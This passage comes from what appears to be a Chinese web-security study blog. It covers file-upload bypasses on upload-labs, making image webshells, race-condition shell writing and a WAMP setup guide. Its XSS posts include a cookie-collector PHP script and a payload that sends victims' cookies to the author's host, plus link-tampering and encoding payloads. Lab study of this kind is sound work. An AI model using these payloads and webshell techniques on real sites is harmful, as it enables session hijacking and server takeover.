取数组最后一个元素，而代码是取索引的最后一个。判断时，判断最后指针的位置 save_name[2] 也就是 jpg，于是绕过后缀名检查。拼接文件名时，使用数组的第一个指针位置即：<code>shell.php/</code>作为文件名，使用下标为 [元素个数-1]，即：索引为 1的数组中的值作为扩展名，我们这里没有写，因此为空。</p><p>之后使用<code>$file_name = reset($file) . '.' . $file[count($file) - 1];</code>拼接文件名就是<code>shell.php/</code>。但是你知道 . 在 windows 中是<code>/.</code>会被去除的。因此，我们上传的文件名为：只需要访问：../upload/shell.php就可以了</p><h1 id="中间件解析漏洞">中间件解析漏洞</h1><p>Apache 解析漏洞从右向左判断后缀名，从而判断能否解析。</p><p>Apache解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如test.php.owf.rar “.owf”和”.rar” 这两种后缀是 apache 不可识别解析，apache就会把 wooyun.php.owf.rar 解析成 php。</p><p>修复方法：要在配置文件里面修改，写解析漏洞的时候再详细讲吧。</p><p>实例：upload lab Pass 19</p><h1 id="图片马">图片马</h1><p>很多时候，我们没有别的办法了，这时候就只能是图片马加上文件包含漏洞了。</p><p>上传图片马，然后确定图片与文件包含的代码文件的相对路径，在文件包含的参数中写上图片马的相对路径及名称，然后使用蚁剑连接即可。</p><p>图片马的制作：</p><ol type="1"><li><p>命令行</p><ol type="1"><li><p>echo php 代码 &gt;&gt; xx.jpg</p></li><li><p>copy 方法 copy baidu.png /b + shell.php /abaidu_shell.png</p></li></ol></li><li><p>用记事本或 Notepad++ 或者 UltraEdit打开图片，在最后粘贴代码即可。</p></li></ol><p>像 upload labs Pass 13 要求的那样，我们电脑上一般都备好 jpg，png，gif三种图片马，用的时候直接拿来用就好了。</p><p>注意：有些网上的图片做图片马不会成功，最好找一些免费没版权的图片来整。如果你的图片马解析不了，不妨多换个七八张个图片试试emm。（这也是为什么让你以后备好图片马的原因，感觉好像是图片问题，不是所有的图片做成图片马之后，都会被正常解析。）</p><h2 id="常见函数">常见函数：</h2><p>unpack() 函数从二进制字符串对数据进行解包，常用来检测文件头。</p><p>可以通过添加图片的头部标识绕过，比如：添加 GIF图片的文件头<code>GIF89a</code>，绕过 GIF 图片检查。</p><p>getimagesize()函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE并产生一条 E_WARNING 级的错误信息。返回值为数组，数组的索引 2给出的是图像的类型，返回的是数字，每个数字对应一种图片类型。</p><p>stripos()函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。</p><p>exif_imagetype —判断一个图像的类型，<strong>exif_imagetype()</strong>读取一个图像的第一个字节并检查其签名。</p><p>upload Pass 13 检测文件头，Pass 14 检测文件类型，Pass 15exif_imagetype检测通过检测图像的第一个字节并检查签名来判断图像类型。</p><h2 id="二次渲染">二次渲染</h2><p>优先使用 gif，其次，jpg，最后 png。</p><p>对 gif 的二次渲染来说，我们上传 gif 图片，然后下载，按 16进制查看下载的图片与原上传的区别，确定渲染处理部分。将一句话插入到未被渲染处理的部分，然后上传即可。</p><p>对于 jpg 以及 png 的处理，可以看<ahref="https://xz.aliyun.com/t/2657#toc-12">upload-labs 之 pass 16详细分析</a>，感觉好像二者相比，jpg更为简单，直接运行大佬的脚本就行了。</p><p>实例：</p><p>Upload labs Pass 16</p><p>这里不详细搞了，遇到再说吧。</p><h1 id="条件竞争">条件竞争</h1><p>条件竞争漏洞是一大类逻辑漏洞，不仅仅限于文件上传，也常见于转账等交易场景。</p><p>从 Pass-17 来看，代码是先移动文件到 upload文件夹，然后判断后缀是否在名单中，再删除与否，我们可以通过一定的时间差来访问自己上传的文件导致写入shell 的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里我们的代码就要稍微改一下，我们改成写文件的代码。这样只要我们访问到一次，我们就生成了shell.php 的一句话，然后再去连接爽歪歪。</p><p>条件竞争常使用：Burp Suite、Fiddle 等抓包工具，或者自己编写 Python脚本来测试</p><p>使用 Burp intruder 模块，开启两个Attack，一个不断上传，一个不断访问上传的文件（当然，你要预先能推测出上传后你的文件名以及位置。）。中间我们需要设置线程数（将访问线程开的比上传的线程打大一些，比如：25:5）以及设置Payload Type 为 nullpayload，然后设置 PayloadOption（设置激发多少次，或者一直攻击），一般我都设置成一直攻击。先发起post 上传 attack，再发起 get 访问 attack。然后根据 get的返回长度及返回数据包，我们发现访问成功以后，便去访问创建的shell.php，查看它是否解析成功，然后用工具去连接。</p><h2 id="参考资料">参考资料</h2><p>来两个简单的，深层次到操作系统的，咱也看不懂，咱也看不下去呀。</p><p>实例：Pass 17，Pass 18</p><p><ahref="https://v0w.top/2018/08/16/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">条件竞争</a></p><p><ahref="https://co0ontty.github.io/2019/04/12/batterupload.html">结合 CTF详解条件竞争漏洞</a></p><p><ahref="https://mengsec.com/2018/04/07/Race-Condition/">条件竞争（RaceCondition）</a></p><h1 id="总结回顾">总结回顾</h1><ol type="1"><li>要接着学，从 Apache 与 PHP 要衍生到别的组合</li><li>熟悉了解中间件的配置文件以及一些关键配置。</li><li>自己搭建环境。复现相关解析漏洞。</li></ol><h1 id="推荐阅读">推荐阅读</h1><p><ahref="https://klionsec.github.io/2017/11/13/ntfs-streams/">文件隐藏 之NTFS 交换数据流</a></p><p><ahref="https://blog.csdn.net/vivilorne/article/details/3841509">谈谈 NTFS数据流文件</a></p><p><a href="https://gh0st.cn/archives/2017-03-29/1">文件寄生——NTFS文件流实际应用</a></p><p><ahref="https://thief.one/2016/09/21/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">服务器解析漏洞</a></p><p><a href="https://xz.aliyun.com/t/4029#toc-7">Upload-labs 20关通关笔记</a></p><p><ahref="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">文件解析漏洞总结</a></p><p><ahref="https://www.anquanke.com/post/id/164561#h3-7">对文件上传的一些思考和总结</a></p><p><ahref="https://paper.seebug.org/560/#2-filename">简单粗暴的文件上传漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> file_upload </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WAMP 安装配置以及 war 包导入 Tomcat</title>
      <link href="/blog/2019/08/20/programming/php/php-mysql-apache-war/"/>
      <url>/blog/2019/08/20/programming/php/php-mysql-apache-war/</url>
      
        <content type="html"><![CDATA[<p>最近被 PHP Study 坑惨了，打开 PHP study 的MySQL、Aapche，在后台找不到服务，Tomcat 导入 war包也连接不上数据库，都是泪呀。</p><p>注意：自己配置好下面的环境后，即使是绿色的 phpstudy等这些工具也不要用了，它会直接禁用本地mysql，apache，而且你还无权访问（管理员账户都不行），唉，我因为这又重装了一遍</p><p>网上找到的教程都很好，这里推荐一下我搭建环境过程中参考的两篇文章</p><p>推荐文章（两个文章一起看，互补）：</p><p><a href="https://www.cnblogs.com/lx0715/p/9955069.html">windows 配置apache2.4+php7.2+mysql8.0</a></p><p><ahref="https://www.w3xue.com/exp/article/20189/817.html">Apache2.4.34 +php 7.28 + MySQL8.0.12 安装及配置</a></p><h1 id="主要步骤">主要步骤</h1><h2 id="apache">apache</h2><ol type="1"><li>修改服务器根路径</li><li>添加 php 扩展（与 php 路径有关），如果你要使用多版本php，只需要在这里的 httpd.conf中对应配置即可（事实上，你可以提前写好，需要用哪个版本，解注释那个版本的配置即可。）<ol type="1"><li>加载 php 中与 apache 相关的 dll</li><li>添加 php.ini 文件路径</li></ol></li><li>命令行安装 apache 服务（可以指定服务名，默认为：Apache2.4）</li></ol><h2 id="php">PHP</h2><ol type="1"><li>修改 php.ini，配置 php 扩展的路径（与路径有关）</li><li>添加 mysql 扩展。</li></ol><h2 id="mysql">MySQL</h2><ol type="1"><li><p>修改 my.ini 配置 mysql 路径（与路径有关）</p></li><li><p>初始化</p></li><li><p>安装服务</p></li><li><p>进入 mysql，修改密码</p><p>alter user 'root'@'localhost' identified by 'youpassword';</p></li></ol><h1 id="遇到的问题">遇到的问题：</h1><ol type="1"><li><p>Apache 2.4 不支持 TLS 3.0，因此会报错</p><p>你可以在 Apache 配置文件 httpd.conf 中 搜索ENABLE_TLS13，会有这样一句 Define ENABLE_TLS13 "Yes"这一句话去掉就行了，这样就 apache 就不会使用 TLS 1.3 了。</p></li><li><p>统一命名</p><p>mysql 我安装的时候，未指定服务名称，我发现 mysql 和 MySQL都可以用，对应的都是服务下 MySQL 那个服务，安装是可以指定服务名称</p><p>apache 也是，服务名称默认是Apache2.4，你在安装的时候，也可以指定。提一句，Tomcat 8 默认的服务名是Tomcat8</p></li><li><p>如果安装的 apache的时候报错了，我采用的是卸载，然后修改对应配置解决，然后再安装的方式。</p></li><li><p>如果要配置虚拟主机需要将 httpd.conf 下的这两句解注释，这样才能是httpd-vhosts.conf 中的配置生效。</p><p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LoadModule vhost_alias_module modules/mod_vhost_alias.so .... Include</span><br><span class="line">conf/extra/httpd-vhosts.conf</span><br></pre></td></tr></table></figure></p><p>我配置的一个虚拟主机，在 extra/httpd-vhosts.conf最后加上下面配置，然后 计算机的 host 中添加 lab11.me 转到 127.0.0.1</p><p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#site 2</span><br><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></span><br><span class="line">ServerName  lab11.me</span><br><span class="line">DocumentRoot &quot;D:/WWW&quot;</span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span>  &quot;<span class="attr">D:</span>/<span class="attr">WWW</span>&quot; &gt;</span></span><br><span class="line">#允许列出目录</span><br><span class="line">Options Indexes</span><br><span class="line">#允许权限覆盖</span><br><span class="line">AllowOverride  All</span><br><span class="line">#允许所有访问</span><br><span class="line">Require  all  granted</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">ErrorLog &quot;logs/lab.me-error.log&quot;</span><br><span class="line">CustomLog &quot;logs/lab.me-access.log&quot; common</span><br><span class="line">DirectoryIndex  abc.php  index.php  index.html</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br></pre></td></tr></table></figure></p></li><li><p>apache 启动发生 “发生服务特定错误: 1.” 可能是 php 32 位 apache 64位，加载 dll 的问题，具体可以去看 window事件日志的应用程序日志。</p></li><li><p>注意：apache 不要使用 nts（no thread safe）php 的版本，php 与apache 版本也有搭配，有的版本不支持有的版本...</p></li></ol><p>将 war 包导入 Tomcat 请看下面博文：</p><p><a href="https://www.cnblogs.com/yaowen/p/5684455.html">war 包放入tomcat</a></p><h1 id="总结反思">总结反思：</h1><ol type="1"><li>之前不太在意 64 位、32位的区别，本次安装知道了象这种套件，版本要一致。</li><li>学会了看程序的日志，Windows系统的事件日志，这对以后确定问题原因很有帮助呀。</li><li>掌握了多版本 php 的配置，当然，也可以多版本 mysql 道理都一样。</li><li>掌握了将 war 包导入 Tomcat 的方法，简单方便。</li></ol>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS 漏洞的攻击手法</title>
      <link href="/blog/2019/08/15/websec/xss/cookie_and%20_reflected_xss/"/>
      <url>/blog/2019/08/15/websec/xss/cookie_and%20_reflected_xss/</url>
      
        <content type="html"><![CDATA[<h1 id="cookie-劫持">Cookie 劫持</h1><h2 id="原理">原理</h2><p>首先，我们有个服务器，当然，这里我在自己电脑上用 php study搭建一个服务器</p><p>其次，我们需要有个脚本来获取用户的 cookie，写入到我们电脑上。</p><p>下面我们写一个脚本：cookie.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;cookie.txt&#x27;</span>,<span class="variable">$cookie</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将其放到 PHP Study 的 WWW 目录下的 xss_test 目录下。</p><p>然后，我们通过浏览器对象中的 Location 对象来改变当前的 URL，将当前cookie 提交到我们指定的 URL 的脚本文件，这样我们可以在脚本文件中将cookie 保留下来。</p><p>注：</p><p><strong>Document.location</strong> 是一个只读属性，返回一个 <ahref="https://developer.mozilla.org/zh-CN/docs/Web/API/Location"><code>Location</code></a>对象，包含有文档的 URL 相关的信息，并提供了改变该 URL 和加载其他 URL的方法。</p><h2 id="测试">测试</h2><p>下面我访问虚拟机的 dvwa 的反射 XSS，并使用 hackbar 将构造的下列paylaod 进行 URL 编码（注：GET 方式的 payload 不能直接写到地址栏，要经过URL 编码）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=<span class="string">&#x27;http://你的主机ip/xss_test/cookie.php?cookie=&#x27;</span>+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>其中，“你的主机 ip” 写你主机的 ip，这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.107.156/dvwa-master/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location%3D&#x27;http%3A%2F%2F113.54.198.24%2Fxss_test%2Fcookie.php%3Fcookie%3D&#x27;%2Bdocument.cookie%3C%2Fscript%3E</span></span><br></pre></td></tr></table></figure><p>然后，我们就可以发给别人，先让他们登录对应网站，然后诱使其点击该URL，这样我们就可以获取其 cookie 了。</p><p>注意：高版本的 phpstudy（没准是 php 版本 或 apache 版本高？）默认增加usertoken，测试会不正常。</p><p>这样我们使用通过修改浏览器 cookie 或使用 burp 截获并修改 cookie来实现会话劫持。</p><p>劫持会话后的操作</p><ol type="1"><li>查看信息，修改配置</li><li>寻找其他漏洞点，比如：寻找文件上传漏洞，上传一句话。</li></ol><h1 id="篡改网页链接">篡改网页链接</h1><h2 id="原理-1">原理</h2><p>window.onload 当窗口加载时，执行匿名函数</p><p>使用 for 循环遍历所有获得的链接的 a 标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">window.onload = function()</span><br><span class="line">&#123;</span><br><span class="line">var links=document.getElementsByTagName(&quot;a&quot;);</span><br><span class="line">for(var i =0; i &lt; links.length;i++)</span><br><span class="line">links.href=&quot;www.baidu.com&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="测试-1">测试</h2><p>将篡改代码注入到对应的 XSS 位置，以 DVWA 反射型 XSS为例，我们在输入框中输入上面的代码，然后使用检查元素方式，便可以查看修改后的链接。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.107.156/dvwa-master/vulnerabilities/xss_r/?name=%3Cscript%3E%0Awindow.onload%20%3D%20function()%0A%7B%0A%09var%20links%3Ddocument.getElementsByTagName(%22a%22)%3B%0A%09for(var%20i%20%3D%200%3B%20i%20%3C%20links.length%3Bi%2B%2B)%0A%09%09links%5Bi%5D.href%3D%22https%3A%2F%2Fwww.baidu.com%22%3B%0A%7D%0A%3C%2Fscript%3E</span></span><br></pre></td></tr></table></figure><p>注入后，网页链接变都会改变为你重定向的网页连接，这样就达到了篡改网页链接的目的，当然，反射型只是一时的，存储型XSS 对篡改网页链接持久有效。</p><p>未完待续...</p>]]></content>
      
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS 涉及的一些编码与引号问题</title>
      <link href="/blog/2019/08/15/websec/xss/some_encoding_js_html/"/>
      <url>/blog/2019/08/15/websec/xss/some_encoding_js_html/</url>
      
        <content type="html"><![CDATA[<h1 id="html-属性值的引号问题">html 属性值的引号问题</h1><p>如果 html文件在写属性值没有用括号包围，默认见到空格会认为该属性值已经完结，后面的字母它会认为是一个空属性。</p><p>html中成对使用上，不缺分单双引号，但是如果引号要嵌套的话，有四种解决方式：</p><ol type="1"><li>内双引号，外单引号</li><li>内单引号，外双引号</li><li>外部不使用引号</li><li>内部使用 HTML 的实体编码：&amp;quot;</li></ol><h1 id="alert-函数">alert 函数</h1><p>事件绑定函数 alert中的参数，如果是数字可以直接写，如果是字符串要加单引号，其他函数也是这样</p><h1 id="js-中字符串的表示方式">js 中字符串的表示方式</h1><p>JavaScript 共有 6种方法可以表示一个字符，当然字符串就是一个个字符拼接起来的了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;z&quot;</span> === <span class="string">&quot;z&quot;</span>; <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;\172&quot;</span> === <span class="string">&quot;z&quot;</span>; <span class="comment">// true8进制</span></span><br><span class="line"><span class="string">&quot;\x7A&quot;</span> === <span class="string">&quot;z&quot;</span>; <span class="comment">// true16进制</span></span><br><span class="line"><span class="string">&quot;\u007A&quot;</span> === <span class="string">&quot;z&quot;</span>; <span class="comment">// trueunicode编码</span></span><br><span class="line"><span class="string">&quot;\u&#123;7A&#125;&quot;</span> === <span class="string">&quot;z&quot;</span>; <span class="comment">// true带括号的unicode编码</span></span><br></pre></td></tr></table></figure><h1 id="js-中的常用编码相关函数">Js 中的常用编码相关函数</h1><p>fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。</p><p>语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(numX,numX,...,numX)</span><br></pre></td></tr></table></figure><table><colgroup><col style="width: 5%" /><col style="width: 94%" /></colgroup><thead><tr class="header"><th style="text-align: left;">参数</th><th style="text-align: left;">描述</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">numX</td><td style="text-align: left;">必需。一个或多个 Unicode值，即要创建的字符串中的字符的 Unicode 编码。</td></tr></tbody></table><h2 id="提示和注释">提示和注释</h2><p><strong>注释：</strong>该方法是 String的静态方法，字符串中的每个字符都由单独的数字 Unicode 编码指定。</p><p>它不能作为您已创建的 String 对象的方法来使用。因此它的语法应该是String.fromCharCode()，而不是 myStringObject.fromCharCode()。</p><p>注意：在这里 numX 与其前面的逗号之间有无空格均可，但是在 html中，如果我们是这样使用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">114</span>,<span class="attr">116</span>,<span class="attr">40</span>,<span class="attr">49</span>,<span class="attr">41</span>))</span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure><p>再扩大一点，是我们在属性值中使用String.fromCharCode()，所以如果你使用上面 payload 的时候，如果String.fromCharCode(97,108,101, 114,116,40,49,41)中的逗号之后有空格，就不会触发 XSS，所以我们有两种解决方式：</p><ol type="1"><li><p>不加空格（注：有的 hackbar 自带空格就很不太好，可以使用 chrome插件中的图标为 H 的那个 hackbar，之前也介绍过。）。</p></li><li><p>将属性值用引号包围起来</p><p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure></p><p>这样，空格啥的就不会被误认为是属性值的结束了。</p></li></ol><p>推荐阅读：</p><p><ahref="https://blog.csdn.net/shadow_zed/article/details/71076339">html标签中，单引号和双引号区别：</a></p><p><a href="http://es6.ruanyifeng.com/#docs/string">字符串的扩展</a></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS 基础及分类</title>
      <link href="/blog/2019/08/15/websec/xss/xss_classification/"/>
      <url>/blog/2019/08/15/websec/xss/xss_classification/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍">介绍</h1><blockquote><p>跨站脚本攻击( Cross Site Scripting )，为了和层叠样式表 csss区分，缩写为 XSS。 恶意攻击者通过 “HTML 注入” 篡改网页，向 Web页面里插入恶意脚本(例如恶意 javaScript 代码)，当用户浏览该页时，嵌入其中 Web 里面的脚本( 例如 javaScript 代码 )会被执行，从而达到恶意攻击用户的目的。</p></blockquote><p>XSS 是客户端代码注入，通常注入代码是 JavaScript。区别于命令注入，SQL注入等服务端代码注入，XSS 的形成和 SQL注入一样，通常是因为对用户可控的地方（数据）与命令区分不严谨（过滤做的不彻底）造成的。</p><h1 id="xss-分类">XSS 分类</h1><table><colgroup><col style="width: 8%" /><col style="width: 50%" /><col style="width: 8%" /><col style="width: 15%" /><col style="width: 16%" /></colgroup><thead><tr class="header"><th>类型</th><th>触发过程</th><th>存储区</th><th>谁来输出</th><th>输出位置</th></tr></thead><tbody><tr class="odd"><td>存储型 XSS</td><td>1.黑客构造 XSS 脚本<br>2.正常用户访问携带 XSS 脚本的页面</td><td>后端数据库</td><td>HTML</td><td>HTTP 响应</td></tr><tr class="even"><td>反射型 XSS</td><td>正常用户访问携带 XSS 脚本的 URL</td><td>URL</td><td>后端 Web 应用程序</td><td>HTTP 响应</td></tr><tr class="odd"><td>DOM 型 XSS</td><td>正常用户访问携带 XSS 脚本的 URL</td><td>URL</td><td>前端 JavaScript</td><td>动态构造的 DOM 结点</td></tr></tbody></table><p>输出在 HTTP 响应中和输出在动态构造的 DOM 结点中有什么区别呢？</p><p>？？？？暂未搞清楚？</p><h1 id="危害">危害</h1><p>盗取用户信息（比如获取用户的 Cookie）、钓鱼、制造蠕虫等。</p><h1 id="分类详解">分类详解</h1><h2 id="存储型">存储型</h2><h3 id="原理">原理</h3><h4 id="形成">形成</h4><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/form_stored_xss.png" /></p><ol type="1"><li>黑客构造携带 XSS 脚本的内容</li><li>浏览器将携带 XSS 脚本的页面内容提交给 web 服务器</li><li>Web 服务器中的 Web 服务器软件(例如：免费的 HTTP 服务器软件：Apache和 Nginx ) 处理浏览器与 Web 服务器的连接与请求过程</li><li>Web 服务器软件根据 HTTP 请求报文，解析文件位置、处理请求参数</li><li>脚本语言解释器（如：php 语言解释器）从 Web服务器软件获取请求参数，并解释对应文件，（存储型 XSS的后端脚本文件一定是有数据库有交互的）</li><li>解释执行的 php 脚本与数据库交互，将携带 XSS脚本的内容存储到数据库中。</li><li>Web 服务器软件处理浏览器与 Web 服务器的应答过程以及关闭连接</li></ol><h4 id="触发">触发</h4><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/trigger_stored_xss_.png" /></p><ol type="1"><li>用户或管理员打开浏览器访问存在 XSS 脚本的页面</li><li>浏览器将页面内容请求提交给 web 服务器</li><li>Web 服务器中的 Web 服务器软件(例如：免费的 HTTP 服务器软件：Apache和 Nginx ) 处理浏览器与 Web 服务器的连接与请求过程</li><li>Web 服务器软件根据 HTTP 请求报文，解析文件位置、处理请求参数</li><li>脚本语言解释器（如：php 语言解释器）从 Web服务器软件获取请求参数，并解释对应文件，（存储型 XSS的后端脚本文件一定是有数据库有交互的）</li><li>解释执行的 php 脚本与数据库交互，将存储在数据库中恶意 xss脚本（一般为网站留言等）查询出来，并拼接到页面的某个地方。</li><li>Web 服务器软件处理浏览器与 Web服务器的应答过程，将内容返回给用户浏览器，浏览器渲染 HTML并显示，因而触发 XSS</li></ol><p>存储型 XSS 是 从数据库中提取恶意的 脚本代码（php脚本与数据库有交互）</p><p>那这是不是先从参数中获取存入数据库中，然后再从数据库中获取呢？</p><p>类似于使用注入点进行二次注入？</p><h3 id="示例">示例</h3><h2 id="反射性">反射性</h2><p>反射型 XSS 又称为非持久性XSS，这种攻击往往具有一次性，点击访问一次含恶意脚本的 url 进行触发。</p><p>与存储型 XSS 不同的是，反射性 XSS 可以在链接 （url ）中查看到很明显的XSS 脚本特征，所以我们一般诱导用户点击时通常采用 url编码、生产短网址的方式增加隐蔽性，以期减弱用户的警惕性。</p><p>一般判断是否存在反射型 XSS的方式：看你的输入是否会在页面上某个地方显示，当然，一般你的输入要有唯一性，这样才好确定的显示的是不是你输入的呀</p><h3 id="原理-1">原理</h3><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/reflected%20xss_prici.png"alt="1565781435376" /><figcaption aria-hidden="true">1565781435376</figcaption></figure><h4 id="形成-1">形成</h4><p>下面的流程就不写那么详细了....</p><ol type="1"><li>攻击者通过邮件等形式将包含 XSS代码的链接发送给正常用户，用户点击访问该 URL</li><li>浏览器向 web 服务器发送请求</li><li>Web 服务器软件解析处理应用参数</li><li>php 语言解释器定位到对应 php 文件，解释执行对应 php脚本，获取请求参数（即：恶意 XSS 脚本）拼接到页面内容中，生成 html文件</li><li>Web 服务器软件响应对应页面内容，然后把带有 XSS 的代码（一般为javaScript 脚本）的 HTML 发送给用户</li><li>用户浏览器渲染 HTML ，触发 XSS 漏洞。</li></ol><h4 id="触发-1">触发</h4><p>反射型 XSS 是从 URL 中提取的参数中含有恶意脚本代码。</p><h3 id="示例-1">示例</h3><p>黑客在 url 中插入恶意脚本，然后发给用户点击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dvwa-master/vulnerabilities/xss_r/?name=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>用户点击访问，后端 php开始处理提交的参数（当然，参数是之前黑客构造的恶意脚本），</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以看到后端 php代码对输入参数未经过滤就直接拼接，导致脚本拼接之后解析出来的是以下代码，这样浏览器渲染的时候，就会产生弹出。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span 